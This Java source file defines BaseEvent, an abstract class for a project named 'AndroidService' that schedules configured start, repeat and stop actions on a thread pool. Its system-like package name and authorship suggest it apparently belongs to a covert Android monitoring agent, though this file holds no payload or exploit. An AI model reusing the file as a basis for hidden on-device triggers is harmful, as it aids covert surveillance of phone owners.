/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.service.event;

import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

import com.android.service.Status;
import com.android.service.ThreadBase;
import com.android.service.action.Action;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfEvent;
import com.android.service.util.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class EventBase.
 */
public abstract class BaseEvent extends ThreadBase {

	/** The Constant TAG. */
	private static final String TAG = "BaseEvent"; //$NON-NLS-1$

	// Gli eredi devono implementare i seguenti metodi astratti

	/**
	 * Parses the.
	 * 
	 * @param event
	 *            the event
	 */
	protected abstract boolean parse(ConfEvent event);

	/** The event. */
	protected ConfEvent conf;
	private int iterCounter;

	public int getId() {
		return conf.getId();
	}

	public String getType() {
		return conf.getType();
	}

	/**
	 * Sets the event.
	 * 
	 * @param event
	 *            the new event
	 */
	public boolean setConf(final ConfEvent conf) {
		if (Cfg.DEBUG) {
			Check.requires(conf != null, "null conf");
		}
		this.conf = conf;
		boolean ret = parse(conf);
		iterCounter = conf.iter;
		return ret;

	}

	private final boolean trigger(int actionId) {
		if (actionId != Action.ACTION_NULL) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " event: " + this + " triggering: " + actionId);//$NON-NLS-1$ //$NON-NLS-2$
			}
			Status.self().triggerAction(actionId);
			return true;
		} else {
			return false;
		}
	}

	protected int getConfDelay() {
		return conf.delay;
	}

	ScheduledThreadPoolExecutor stpe = new ScheduledThreadPoolExecutor(5);

	boolean active;
	private ScheduledFuture<?> future;

	protected synchronized void onEnter() {
		//if (Cfg.DEBUG) Check.asserts(!active,"stopSchedulerFuture");		
		if(active){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onEnter): already active, return");
			}
			return;
		}
		
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onEnter): " +this);
		}
		int delay = getConfDelay();
		int period = getConfDelay();

		triggerStartAction();

		future = stpe.scheduleAtFixedRate(new Runnable() {
			int count = 0;

			public void run() {
				if (count >= iterCounter) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (run): count >= iterCounter");
					}
					stopSchedulerFuture();
					return;
				}
				triggerRepeatAction();

				if (Cfg.DEBUG) {
					Check.log(TAG + " (run) count: " + count);
				}

				count++;
			}
		}, delay, period, TimeUnit.MILLISECONDS);
		active = true;

	}

	private void stopSchedulerFuture() {
		if (Cfg.DEBUG) Check.asserts(active,"stopSchedulerFuture");
		if (active && future!=null) {
			future.cancel(true);
			future = null;
		}
	}

	protected synchronized void onExit() {
		//if (Cfg.DEBUG) Check.asserts(active,"stopSchedulerFuture");
		if (active) {	
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onExit): " + this);
			}
			stopSchedulerFuture();
			active = false;
		}
	}

	protected synchronized boolean stillIter() {
		iterCounter--;
		return iterCounter >= 0;
	}

	private boolean triggerStartAction() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (triggerStartAction)");
		}
		if (Cfg.DEBUG) {
			Check.requires(conf != null, "null conf");
		}
		return trigger(conf.startAction);
	}

	private boolean triggerStopAction() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (triggerStopAction)");
		}
		if (Cfg.DEBUG) {
			Check.requires(conf != null, "null conf");
		}
		return trigger(conf.stopAction);
	}

	private boolean triggerRepeatAction() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (triggerRepeatAction)");
		}
		if (Cfg.DEBUG) {
			Check.requires(conf != null, "null conf");
		}
		return trigger(conf.repeatAction);
	}

	@Override
	public String toString() {
		return "Event (" + conf.getId() + ") " +conf.getType() +" : " + conf.desc + " " + (isEnabled()?"ENABLED":"DISABLED"); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
	}

	public boolean isEnabled() {		
		return conf.enabled;
	}

}